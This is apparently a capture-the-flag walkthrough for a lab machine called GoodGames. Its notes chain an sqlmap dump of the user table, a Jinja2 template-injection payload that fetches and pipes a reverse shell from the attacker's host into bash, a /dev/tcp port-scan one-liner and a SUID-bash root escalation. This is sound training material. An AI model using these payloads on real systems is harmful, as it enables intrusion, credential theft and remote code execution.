## GoodGames

| Name      | IP           | Difficulty | OS   |
| --------- | ------------ | ---------- | ---- |
| goodgames | 10.10.11.130 | Linux      | Easy |

## NMAP

| HOST         | PORT | PROTO | SERVICE      | VERSION |
| ------------ | ---- | ----- | ------------ | ------- |
| 10.10.11.130 | 80   | tcp   | Apache httpd | 2.4.51  |

## HEADERS



## DIRECTORIES

- /blog
- /login
- /profile
- /logouti
- /forgot-password
- /coming-soon

## USERS

- admin superadministrator
- augustus

## NOTES

- Save login request and dump user table `sqlmap -r login.req --batch --dump -D main -T user`
- Crack admin password in Crackstation
- Login with admin credentials to internal-administration.goodgames.htb
- The full name field in settings is SSTI vulnerable, tested with `{{1+1}}`
- Helpful article on SSTI - https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
- curl and exectue bash reverse shell`{{request.application.__globals__.__builtins__.__import__('os').popen('curl http://10.10.14.5:8000/shell | bash').read()}}`
- Dockerfile in /backend directory, in a docker container
- There's an eth0 NIC with the IP `172.19.0.2`
- Scan open ports on the IP with only bash available `for port in $(seq 1 1000); do timeout 0.01 bash -c "</dev/tcp/172.19.0.1/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done` from https://github.com/AlexRandomed/One-Liner-Bash-Scanner
- SSH is open, SSH as `augustus` with the password `superadministrator`
- Copy bash to augustus' home directory `cp /bin/bash .` and exit SSH
- Make bash owned by root `chown root:root bash`
- Make bash readable and executable by augustus `chmod 4755 bash`
- SSH back in as augustus and run `./bash -p` to spawn a shell as root
